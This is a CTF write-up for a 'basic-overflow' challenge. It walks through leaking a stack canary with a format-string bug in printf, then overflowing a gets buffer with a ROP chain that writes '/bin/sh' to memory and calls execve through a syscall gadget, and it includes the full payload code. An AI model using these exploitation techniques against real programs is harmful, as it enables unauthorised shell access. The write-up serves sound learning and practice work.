# Writeup for "basic-overflow"

## 1. Initial recon

Again, we always start with checksec:
```
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
No PIE, but canary is enabled. To overflow you must first leak the canary. 

I remember a similar challenge written by a friend for blahaj24 that also has canary enabled, but the solve was to abuse uninitialised variable scanf arb write rather than leaking canary, anyway not relevant here.

My dumbass actually thought I should make the output equal to "purple", but apparently not so.

This is because:
```
    if (choice == "Purple") { // choice here is the pointer, not the value.
        printf("You are correct! Here is your flag: grifflesCTF{fake_flag}");
```
Note that choice here is a pointer, so it tries to equate a POINTER to the value "Purple", which would basically always return false.

After looking at the code

```
    gets(name); // overflow 1
    ...
    printf(name);
```

We can see that this function is vulernable to string format attack (from experience lmao, if no format is specified sending it %x will leak the stack).

Hence, i sent it basically a lot of %llx and %llp to leak the stack, but eventually obtain repeated values

Decoding said repeated values made me realise i sent to much %llx and it is overwriting the stack itself resulting in it printing out more %llx's on the stack.

Simple solve though: Just use %x$p, where x is the position, to leak more stack data. 

# 2. Exploitation of strfmt vuln

By comparing output of x/x $rbp-0x8 (From pwndbg) to the stack canary, we eventually figure out that leaking the stack with %15$p will provide us with the stack canary in the first printf output.

Using the canary value and the offset to the canary, we simply craft the payload:
```
payload = b"A" * offset_to_canary
    payload += p64(canary)     # Overwrite canary with its own value
```
to be able to arb write after that.

I found the static offset of the line where flag is supposedly printed, but apparently the fake flag is in the actual executable? (Not too sure on this one), so there's actually no win func to jump to.

No matter, just ROP my way out of this again

# 3. Ropping (Very painful)

Here's the rop gadgets we need:
1. ret (to align stack)
2. pop rdi 
3. pop rax
4. pop rsi
5. pop rdx
(These are needed to construct arguments to execve)
6. Some kinda mov function, specifically mov [reg1], reg2: Moves value of reg2 into POSITION of reg1 (to move /bin/sh into a register)
7. system() call


Other things we need: 
1. Position of writable memory to write /bin/sh onto 

After initial finding with python rop, we are missing some gadgets. namely,
- we dont have pop rdx
- no mov [reg1], reg2, specifically one that moves something into position of rax

Using ropper we are able to find all avaliable gadgets.
- There's a pop rdx gadget, but it has a side effect of also popping rbx
`0x000000000048618b: pop rdx; pop rbx; ret; `
- There's a mov rax, rdi gadget, but it has a side effect of also scrambling rax. No biggie though.
```
pwndbg> x/i 0x00000000004475a0
   0x4475a0 <__memset_sse2_unaligned_erms+224>: mov    QWORD PTR [rax],rdi
pwndbg> x/10i 0x45285b
   0x45285b <_dl_get_tls_static_info+11>:       mov    QWORD PTR [rdi],rax
   0x45285e <_dl_get_tls_static_info+14>:
    mov    rax,QWORD PTR [rip+0x74d73]        # 0x4c75d8 <_dl_tls_static_align>
   0x452865 <_dl_get_tls_static_info+21>:       mov    QWORD PTR [rsi],rax
   0x452868 <_dl_get_tls_static_info+24>:       ret
```

We will have to go with it..

After that, we can just ROP our way out of this.

Final payload:

```
payload = b"A" * offset_to_canary
    payload += p64(canary)     # Overwrite canary with its own value
    payload += p64(ret_g)      # Overwrite saved RBP (ret_g is fine, acts as a dummy RBP or alignment)

    # ROP Chain for execve("/bin/sh", NULL, NULL)
    
    # 1. Set up RSI and RDX for execve. These are done first as they are not
    #    clobbered by the subsequent string write operations.
    payload += p64(pop_rsi)
    payload += p64(writable_area + 40)
    
    payload += p64(pop_rdx_rbx)
    payload += p64(0)
    payload += p64(0) # Set rbx to null as well

    #    RAX = binshstr_qword
    payload += p64(pop_rax)
    payload += binshstr_qword            
    #    RDI = writable_area (where "/bin/sh\0" will be written)
    payload += p64(pop_rdi)
    payload += p64(writable_area)         
    

    payload += p64(mov_rax_rdi)      # Side effect: RSI must be valid

    # /bin/sh moved into rdi location

    payload += p64(pop_rsi)
    payload += p64(0) # Reset RSI

    payload += p64(pop_rax)
    payload += p64(execve_id)                 # RAX = 0x3b (syscall number for execve)
    
    payload += p64(syscall_g)                 # Execute syscall

    log.info("Sending the exploit payload...")
    r.sendline(payload)
```